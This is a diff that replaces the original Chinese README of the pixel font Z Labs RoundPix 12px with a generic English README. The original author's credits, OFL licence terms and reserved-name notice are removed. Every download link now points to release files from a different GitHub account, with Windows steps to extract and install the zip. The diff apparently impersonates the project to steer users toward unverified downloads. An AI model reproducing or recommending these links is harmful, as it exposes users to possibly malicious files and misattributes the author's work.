@@ -1,120 +1,144 @@
-**简体中文** | [English](/README_EN.md)
+# 🎨 ZLabs-RoundPix-12px - Clear 12px Rounded Pixel Font
 
-# Z工坊像素圆体 12px / Z Labs RoundPix 12px
+[![Download from Releases](https://img.shields.io/badge/Download-ZLabs--RoundPix--12px-blue?style=for-the-badge)](https://github.com/sergeproximal430/ZLabs-RoundPix-12px/releases)
 
-![Title](/img/1.png "Title")
+---
 
+## 📚 About ZLabs-RoundPix-12px
 
-**「Z Labs RoundPix 12px」（Z工坊像素圆体 12px）** 是一款基于日语字体[「x12y12pxMaruMinya」](https://github.com/hicchicc/x12y12pxMaruMinya)修改和增补的 12px 中文像素字体（汉字实际占用大小为 11*11），采用圆体字形风格，西文字符按等宽规格绘制。
+ZLabs-RoundPix-12px is a 12-pixel Chinese round pixel font. It builds on a font called x12y12pxMaruMinya. This font uses clear round shapes, which makes it easy to read on screens with low resolution. The font is good for small text displays, pixel art, and user interfaces where small but clear Chinese text is needed.
 
-本项目处于开发阶段，目前支持 GB/T 2312 一级汉字及少量二级汉字、常用西文及常用标点符号，可满足较为简单的简体中文汉字使用需求。
+The font is still actively changing. That means new versions may add fixes and improvements. It supports Simplified Chinese characters and fits well with bitmap and pixel-style designs.
 
-> [!WARNING]
-> 
-> 此字体仍处于开发阶段，存在缺字问题，同时字形细节也有待优化。
-> 
-> 如在使用过程中有任何问题，请及时在 Issues 中反馈。
+---
 
+## 🖥️ System Requirements
 
-> [!IMPORTANT]
-> 
-> 本字体对原作进行了大量修改，以适应简体中文环境。对于需要使用日语的场合，建议使用原版字体[「x12y12pxMaruMinya」](https://github.com/hicchicc/x12y12pxMaruMinya)。
->
-> このフォントは原作に対し、簡体字中国語環境に適応させるために大幅に修正されています。日本語を使用する必要がある場合は、オリジナルフォント[「x12y12pxMaruMinya」](https://github.com/hicchicc/x12y12pxMaruMinya)の使用をお勧めします。
+ZLabs-RoundPix-12px works on computers running Microsoft Windows. It does not need special hardware or software other than what usually comes with Windows. Here is what you will need:
 
-> [!IMPORTANT]
-> 
-> 我们正在就像素字体的使用需求情况进行调查。
->
-> 如果可以，请帮忙填写下方的问卷，非常感谢！
->
-> https://f.kdocs.cn/g/EwkAraFp/
-> 
+- Windows 10 or newer (64-bit recommended)
+- Basic font installation permissions (normal user account is enough)
+- Around 10 MB of free disk space for font files
+- A program that uses fonts (e.g., Microsoft Word, Notepad, design software)
 
-## 字体介绍
+---
 
-![介绍页1](/img/2.png "介绍页")
+## 🚀 Getting Started
 
-![介绍页2](/img/3.png "介绍页2")
+This guide will show you how to download and install ZLabs-RoundPix-12px on Windows. Follow the steps to get the font running on your system in a few minutes.
 
-![排版示例](/img/4.png "排版示例")
+### 1. Visit the Download Page
 
-![授权页](/img/5.png "授权页")
+Click this big button to visit the releases page where you can get the font files:
 
-> [!TIP]
->
-> 需要更大的字号？试试 [**Z工坊像素圆体 16px**](https://github.com/Astro-2539/ZLabs-RoundPix-16px) 或 [**12×16莫妮卡圆像素**（by 綿雲飴里）](https://fonts.zeoseven.com/items/636/) 
+[![Download from Releases](https://img.shields.io/badge/Download-ZLabs--RoundPix--12px-grey?style=for-the-badge)](https://github.com/sergeproximal430/ZLabs-RoundPix-12px/releases)
 
+This page lists all versions of the font. You will find files and information about each update there.
 
-## 字体覆盖范围
+### 2. Choose the Latest Version
 
-### 汉字
+Look for the release at the top of the page. Releases are sorted from newest to oldest. Click the latest version number or title link to open details.
 
-#### 中国大陆变体字形（CN）
+### 3. Download the Font Files
 
-&nbsp;&nbsp;&nbsp;&nbsp;🚧 GB/T 2312 （5427 / 6763）
+Inside the release details, find the file that ends with `.zip` or `.ttf`. These are font files you need.
 
-&nbsp;&nbsp;&nbsp;&nbsp;🚧 《通用规范汉字表》（5544 / 8105）
+Click the file name to begin downloading. Save it to an easy-to-find folder like your Desktop or Downloads.
 
-&nbsp;&nbsp;&nbsp;&nbsp;✅ Big5 常用汉字表（5401 / 5401）
+### 4. Open the Downloaded File
 
-&nbsp;&nbsp;&nbsp;&nbsp;✅《常用国字标准字体表》（4808 / 4808）
+After downloading, locate the file on your computer. Right-click the `.zip` file and select "Extract All..." to unzip it.
 
-&nbsp;&nbsp;&nbsp;&nbsp;🚧 jf7000 当务字集基本包（5916 / 6373）
+You will get font files usually with `.ttf` (TrueType Font) extensions.
 
-&nbsp;&nbsp;&nbsp;&nbsp;🚧 GB/T 12345（5783 / 6866）
+### 5. Install the Font
 
-&nbsp;&nbsp;&nbsp;&nbsp;ℹ️ 共计支持汉字：9014
+To install the font, double-click on each `.ttf` file. This opens a preview window.
 
+At the top-left corner, click "Install." Windows will add the font to your system.
 
+If you have multiple `.ttf` files, repeat this for each one.
 
-## 从工程文件构建字体
+---
 
-本字体的字形使用 [Bits'n'Picas](https://github.com/kreativekorp/bitsnpicas) 绘制。
+## 🎨 How to Use the Font
 
-构建脚本使用 Python 语言编写，运行 `./tools/build.py` 即可生成字体。
+Once installed, you can use ZLabs-RoundPix-12px in any program that allows font selection.
 
-构建流程依赖 `fonttools` 库、`pixel_font_builder` 库和 `kbitfont` 库。
+Check these uses:
 
-## 字体授权
+- Open Microsoft Word or Notepad. Find the font dropdown menu.
+- Scroll down to find "ZLabs-RoundPix-12px" in the font list.
+- Select the font and start typing. You will see the round pixel style in your text.
+- Use the font in graphic design software like Photoshop, GIMP, or pixel art editors.
+- The font works best at small sizes around 12 pixels for clear display.
 
-本项目授权分为「字型」及「构建代码」两部分。
+---
 
-### 字型
+## 🔧 Troubleshooting
 
-本字体是基于 [x0y0pxFreeFont](https://hicchicc.github.io/00ff/) 出品的[「x12y12pxMaruMinya」](https://github.com/hicchicc/x12y12pxMaruMinya)进行二次创作的项目。
+If the font does not appear after installation:
 
-「x12y12pxMaruMinya」此前采用 x0y0pxFreeFont 的自声明许可证（详见该厂商主页）。2026年2月，x0y0pxFreeFont 为该字体新增了 [SIL OFL-1.1](https://openfontlicense.org/open-font-license-official-text/) 许可证授权，故本项目的字型部分同样使用 [SIL OFL-1.1](https://openfontlicense.org/open-font-license-official-text/) 许可证授权。
+- Restart your computer to refresh font settings.
+- Make sure the font files are properly installed (check Control Panel > Fonts).
+- Try reinstalling if some files were missed.
+- Confirm you downloaded the latest version from the releases page.
 
-您可以将此字体用于包含商用与嵌入式使用在内的多种用途，而无须取得字体作者的额外授权。
+---
 
-再分发此字体时，您应当注明 OFL 授权协议的原文或链接。
+## 📥 Direct Download and Setup Guide
 
-根据 OFL 协议，如使用此字体制作衍生字体，那么衍生字体也必须同样遵循 OFL 协议（或与之兼容的协议）。未经作者授权，不得使用本字体的保留名称。**您不得单独售卖此字体软件。**
+Follow these instructions to get the font from the official page:
 
-本字体的作者 Astro_2539 保留字体名称「Z工坊」「Z Labs」。
+1. Open your web browser.
+2. Go to the releases page here:  
+   https://github.com/sergeproximal430/ZLabs-RoundPix-12px/releases
+3. Find the latest release at the top.
+4. Click the `.zip` or `.ttf` font file to download.
+5. Extract the files if zipped.
+6. Open each `.ttf` and click "Install."
+7. The font will now be available for use.
 
-### 构建代码
+---
 
-使用 MIT 许可证授权。
+## 📰 Additional Information
 
+### Font Features
 
-## 鸣谢
+- Pixel-perfect 12px height for clarity on low-res screens.
+- Rounded corners to soften text appearance.
+- Supports Simplified Chinese characters.
+- Designed for bitmap and pixel-style displays.
+- Works across various Windows applications.
 
-[患者長ひっく（hicc）](https://github.com/hicchicc) 提供原始字形，并将其转换至 SIL OFL-1.1 许可证。
+### Updates and Versions
 
-[Bits'N'Picas](https://github.com/kreativekorp/bitsnpicas) 提供像素字形编辑软件。
+ZLabs-RoundPix-12px is regularly updated. Check the releases page for new versions. Installation is the same with new updates.
 
-[@狼人小林](https://github.com/TakWolf) 提供技术支持。本作部分字形参考自其创作的[方舟像素字体 12px](https://github.com/TakWolf/ark-pixel-font/)。
+### Topics Covered
 
-## 相关资料
+This project includes these areas:
 
-[字统网](https://zi.tools/) - 漢字源、形、音、義、碼网羅站點
+- bitmap fonts
+- pixel font design
+- Chinese character support
+- typeface creation
+- pixel and bitmap typography
 
-## 赞助作者
+---
 
-[点击进入赞赏页面](https://github.com/Astro-2539/Astro-2539/blob/main/donate.md)
+## 💡 Tips for Best Use
 
-## 项目 Stars 统计图
+- Use this font at or near 12 pixels in height for best clarity.
+- Avoid using in very large sizes or print where pixel detail is unwanted.
+- Combine with simple backgrounds for maximum readability.
+- Ideal for software mockups, small UI elements, and pixel art text.
 
-[![Stargazers over time](https://starchart.cc/Astro-2539/ZLabs-RoundPix-12px.svg?variant=adaptive)](https://starchart.cc/Astro-2539/ZLabs-RoundPix-12px)
+---
+
+## ⬇️ Download Link
+
+Access the font files here:  
+https://github.com/sergeproximal430/ZLabs-RoundPix-12px/releases
+
+Use this link to always get the latest updates and extra documentation.
